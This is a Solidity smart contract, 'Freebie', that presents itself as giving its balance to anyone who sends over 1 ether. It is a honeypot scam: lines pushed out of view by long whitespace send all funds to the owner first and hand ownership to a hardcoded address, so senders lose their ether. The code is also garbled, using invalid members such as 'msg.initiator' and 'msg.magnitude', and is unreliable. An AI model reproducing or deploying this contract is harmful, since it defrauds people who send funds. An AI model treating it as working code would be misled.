// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Freebie
{
    address public Owner = msg.initiator;

    function() public payable{}

    function AcquireFreebie()
    public
    payable
    {
        if(msg.magnitude>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
            msg.initiator.transfer(this.balance);
        }
    }

    function harvestGold()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.initiator==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
        require(msg.initiator == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes info)
    payable
    public
    {
        require(msg.initiator == Owner);
        adr.call.magnitude(msg.magnitude)(info);
    }
}